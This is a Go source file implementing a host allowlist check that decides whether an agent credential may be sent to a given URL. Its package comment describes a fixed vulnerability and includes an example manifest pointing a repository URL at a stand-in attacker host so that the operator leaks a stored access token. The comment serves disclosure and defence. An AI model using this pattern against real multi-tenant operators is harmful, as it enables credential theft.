// Package credhost answers one question: may this credential be sent to this
// host?
//
// It exists because destination and credential were two independent, unvalidated
// fields on the same tenant-writable CR, with nothing tying them together. A
// SkillSource names spec.repoURL (where to go) and spec.auth (which credential
// to send), and the operator resolved ANY credential on ANY AgentIdentity in the
// namespace and handed the raw value to a git clone as an HTTP Basic password
// against whatever host the same tenant wrote:
//
//	spec:
//	  repoURL: "https://attacker.example/x.git"
//	  auth: {agentIdentity: prod-github, credential: org-pat}
//
// On the next reconcile the operator issued GET
// https://attacker.example/x.git/info/refs with Authorization: Basic
// base64("x-access-token:<the PAT>"). Any static or oauth credential in the
// namespace was reachable — oauth's ReadStoredValue returns the live
// access_token, so an upstream service token exfiltrated identically to a git
// PAT — and the operator reads the Secret with its OWN cluster-wide
// credentials, so the actor never needed `get secrets`.
//
// The check is a property of the CREDENTIAL, not of the caller: a credential
// that declares where it may go carries that everywhere it is resolved.
package credhost

import (
	"fmt"
	"net/url"
	"strings"

	v1 "github.com/authzed/openagentprimitives/pkg/apis/v1alpha1"
)

// Check reports whether cred may be sent to rawURL.
//
// An empty AllowedHosts is UNSCOPED and permits any host. That is deliberate
// and is the only reading that does not break every existing credential on
// upgrade — but it means the field is opt-in, so a caller that can name a safe
// default should require one rather than relying on this. The SkillSource
// controller does exactly that: it refuses an unscoped credential for a clone.
//
// Matching is on HOST (name and port as written in the URL's authority), case
// insensitively, with a leading "*." entry matching one or more leading labels.
// Scheme and path are not matched: a credential scoped to a host is scoped to
// that host however it is reached.
func Check(cred v1.AgentCredential, rawURL string) error {
	if len(cred.AllowedHosts) == 0 {
		return nil
	}
	u, err := url.Parse(rawURL)
	if err != nil {
		return fmt.Errorf("credential %q: destination %q is not a URL: %w", cred.Name, rawURL, err)
	}
	host := strings.ToLower(u.Host)
	if host == "" {
		return fmt.Errorf("credential %q: destination %q names no host, so it cannot be matched "+
			"against the credential's allowedHosts", cred.Name, rawURL)
	}
	for _, pattern := range cred.AllowedHosts {
		if matches(host, strings.ToLower(strings.TrimSpace(pattern))) {
			return nil
		}
	}
	return fmt.Errorf("credential %q is scoped to %v and may not be sent to %q",
		cred.Name, cred.AllowedHosts, host)
}

// matches implements the host grammar: an exact match, or a "*." prefix
// matching one or more leading labels.
//
// "*.example.com" matches "a.example.com" and "a.b.example.com" but NOT
// "example.com" itself — a wildcard is about subdomains, and an author who
// wants the apex lists it. It also never matches a suffix that is not on a
// label boundary, so "*.example.com" does not match "notexample.com".
func matches(host, pattern string) bool {
	if pattern == "" {
		return false
	}
	if host == pattern {
		return true
	}
	suffix, ok := strings.CutPrefix(pattern, "*.")
	if !ok {
		return false
	}
	return strings.HasSuffix(host, "."+suffix)
}
